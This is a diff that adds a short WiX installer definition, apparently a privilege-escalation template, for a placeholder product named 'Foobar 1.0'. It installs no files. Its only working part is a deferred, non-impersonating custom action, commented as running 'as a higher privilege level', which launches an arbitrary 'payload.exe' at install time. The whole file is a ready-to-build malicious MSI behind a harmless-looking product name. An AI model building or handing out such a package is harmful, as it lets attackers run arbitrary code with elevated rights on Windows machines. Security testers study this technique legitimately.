@@ -1,0 +1,29 @@
+<?xml version='1.0' encoding='windows-1252'?>
+<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
+  <Product Name='Foobar 1.0' Id='*' 
+    Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='Acme Ltd.'>
+
+	<Package InstallerVersion="100" Languages="0" Manufacturer="Acme Ltd." ReadOnly="no" />	
+	
+	<Media Id='1' Cabinet='product.cab' EmbedCab='yes' />
+
+	<Directory Id='TARGETDIR' Name='SourceDir'>
+	   <Component Id='MyComponent' Guid='12345678-1234-1234-1234-123456789012'>
+		  <Condition>0</Condition>
+	   </Component>		
+	</Directory>
+	
+	<!-- Execute must be deferred and Impersonate no to run as a higher privilege level -->
+	<CustomAction Id='ExecNotepad' Directory='TARGETDIR' Impersonate='no' Execute='deferred' ExeCommand='[SourceDir]payload.exe' Return='asyncNoWait'/>
+
+    <Feature Id='Complete' Level='1'>
+		<ComponentRef Id='MyComponent' />
+    </Feature>
+	
+	<InstallExecuteSequence>
+		<ResolveSource After="CostInitialize" />
+		<Custom Action="ExecNotepad" After="InstallInitialize" />
+	</InstallExecuteSequence>
+
+  </Product>
+</Wix>
